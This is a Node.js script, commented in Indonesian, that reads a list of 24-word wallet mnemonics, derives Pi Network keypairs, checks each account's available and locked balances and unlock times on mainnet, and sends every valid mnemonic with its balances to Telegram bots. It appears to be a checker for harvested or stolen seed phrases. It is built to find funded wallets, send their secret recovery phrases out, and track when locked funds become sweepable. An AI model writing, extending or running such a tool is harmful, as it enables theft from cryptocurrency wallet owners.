const fs = require('fs');
const axios = require('axios');
const bip39 = require('bip39');
const edHd = require('ed25519-hd-key');
const StellarSdk = require('stellar-sdk');

// ===================================================================
// GANTI DENGAN INFO TELEGRAM KAMU
// ===================================================================

// Bot 1: Untuk notifikasi SALDO TERKUNCI
const TELEGRAM_LOCKUP_BOT_TOKEN = 'YOUR_LOCKUP_BOT_TOKEN'; // <<< GANTI INI
const TELEGRAM_LOCKUP_CHAT_ID = 'YOUR_LOCKUP_CHAT_ID';     // <<< GANTI INI

// Bot 2: Untuk notifikasi SALDO TERSEDIA
const TELEGRAM_AVAILABLE_BOT_TOKEN = 'YOUR_AVAILABLE_BOT_TOKEN'; // <<< GANTI INI
const TELEGRAM_AVAILABLE_CHAT_ID = 'YOUR_AVAILABLE_CHAT_ID';     // <<< GANTI INI

// ===================================================================

const server = new StellarSdk.Server('https://api.mainnet.minepi.com');

// Fungsi kirim Telegram yang lebih fleksibel
async function kirimTelegram(pesan, botToken, chatId) {
  // Jangan kirim jika token belum diisi
  if (!botToken || botToken.includes('YOUR_')) {
    console.warn(`⚠️ Token Bot belum diisi. Pesan tidak dikirim.`);
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await axios.post(url, {
      chat_id: chatId,
      text: pesan,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error(`❌ Gagal kirim ke Telegram (Chat ID: ${chatId}):`, error.message);
  }
}

// Ubah mnemonic ke keypair Stellar
function mnemonicToStellarKeypair(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const { key } = edHd.derivePath("m/44'/314159'/0'", seed);
  return StellarSdk.Keypair.fromRawEd25519Seed(key);
}

// Fungsi untuk mengecek saldo terkunci
async function cekSaldoTerkunci(mainAccount) {
  try {
    // 1. Dapatkan ID akun lockup dari data akun utama
    // Data ini disimpan dalam format base64, jadi perlu di-decode
    if (!mainAccount.data_attr || !mainAccount.data_attr.lockup_account) {
      return null; // Tidak ada data lockup
    }
    const lockupAccountId = Buffer.from(mainAccount.data_attr.lockup_account, 'base64').toString('ascii');

    // 2. Muat akun lockup
    const lockupAccount = await server.loadAccount(lockupAccountId);

    // 3. Cari hash transaksi pre-authorized yang menjadi penanda lockup
    const preauthSigner = lockupAccount.signers.find(s => s.type === 'preauth_tx');
    if (!preauthSigner) {
      return null; // Tidak ada transaksi lockup
    }
    const txHash = preauthSigner.key;

    // 4. Ambil detail transaksi untuk mendapatkan waktu buka kunci
    const tx = await server.transactions().transaction(txHash).call();
    
    // Waktu buka kunci ada di `valid_before` (dalam format Unix timestamp)
    const unlockTimestamp = parseInt(tx.valid_before, 10);
    const unlockTime = new Date(unlockTimestamp * 1000); // Konversi ke milidetik untuk JS

    // 5. Saldo terkunci adalah saldo dari akun lockup itu sendiri
    const nativeBalance = lockupAccount.balances.find(b => b.asset_type === 'native');
    const lockedBalance = nativeBalance ? nativeBalance.balance : '0.0000000';

    return { lockedBalance, unlockTime };
  } catch (error) {
    // Jika ada error (misal akun lockup tidak ditemukan), anggap tidak ada lockup
    console.warn(`- Info: Tidak dapat memverifikasi saldo terkunci untuk akun ${mainAccount.id}. Mungkin tidak ada.`);
    return null;
  }
}

// Ambil dan filter daftar mnemonic dari file
const mnemonics = fs.readFileSync('pharses.txt', 'utf8')
  .split('\n')
  .map(line => line.trim())
  .filter(line => line && line.split(' ').length === 24);

// Kosongkan file hasil sebelumnya
fs.writeFileSync('valid.txt', '');
fs.writeFileSync('invalid.txt', '');

// Cek setiap mnemonic
async function cekSemua() {
  for (const mnemonic of mnemonics) {
    try {
      const keypair = mnemonicToStellarKeypair(mnemonic);
      const pubkey = keypair.publicKey();

      const account = await server.loadAccount(pubkey);

      // --- Perhitungan Saldo ---
      const nativeBalance = account.balances.find(balance => balance.asset_type === 'native');
      const totalBalance = nativeBalance ? nativeBalance.balance : '0.0000000';
      const baseReserve = (2 + account.subentry_count) * 0.5;
      const availableBalance = (parseFloat(totalBalance) - baseReserve).toFixed(7);
      
      console.log(`✅ Terdaftar: ${pubkey} | Tersedia: ${availableBalance} PI`);
      fs.appendFileSync('valid.txt', `${mnemonic}\n`);

      // --- Kirim Notifikasi ke Bot 2 (Saldo Tersedia) ---
      const pesanAvailable = `✅ *Akun Valid Ditemukan*\n\n` +
                             `*Mnemonic:*\n\`${mnemonic}\`\n\n` +
                             `*Public Key:*\n\`${pubkey}\`\n\n` +
                             `*Saldo Tersedia:*\n\`${availableBalance} PI\``;
      await kirimTelegram(pesanAvailable, TELEGRAM_AVAILABLE_BOT_TOKEN, TELEGRAM_AVAILABLE_CHAT_ID);

      // --- Cek dan Kirim Notifikasi Saldo Terkunci ---
      const lockupInfo = await cekSaldoTerkunci(account);
      if (lockupInfo) {
        const { lockedBalance, unlockTime } = lockupInfo;

        // Format tanggal agar mudah dibaca
        const tglBuka = unlockTime.toLocaleDateString('id-ID', { year: 'numeric', month: 'long', day: 'numeric' });
        const jamBuka = unlockTime.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

        console.log(`   🔒 Saldo Terkunci: ${lockedBalance} PI | Buka: ${tglBuka} ${jamBuka}`);
        
        // Kirim notifikasi ke Bot 1 (Saldo Terkunci)
        const pesanLockup = `🔒 *SALDO TERKUNCI TERDETEKSI*\n\n` +
                            `*Mnemonic:*\n\`${mnemonic}\`\n\n` +
                            `*Public Key:*\n\`${pubkey}\`\n\n` +
                            `*Jumlah Terkunci:*\n\`${lockedBalance} PI\`\n\n` +
                            `*Waktu Buka Kunci:*\n` +
                            `\`${tglBuka}, pukul ${jamBuka}\``;
        await kirimTelegram(pesanLockup, TELEGRAM_LOCKUP_BOT_TOKEN, TELEGRAM_LOCKUP_CHAT_ID);
      }

    } catch (err) {
      if (err.response && err.response.status === 404) {
        const keypair = mnemonicToStellarKeypair(mnemonic);
        const pubkey = keypair.publicKey();
        console.log(`❌ Tidak terdaftar: ${pubkey}`);
        fs.appendFileSync('invalid.txt', `${mnemonic}\n`);
      } else {
        console.error(`⚠️ Error saat cek mnemonic: ${mnemonic}`, err.message || err);
      }
    }
    // Beri jeda sedikit agar tidak membanjiri API server
    await new Promise(resolve => setTimeout(resolve, 500));
  }
}

cekSemua();
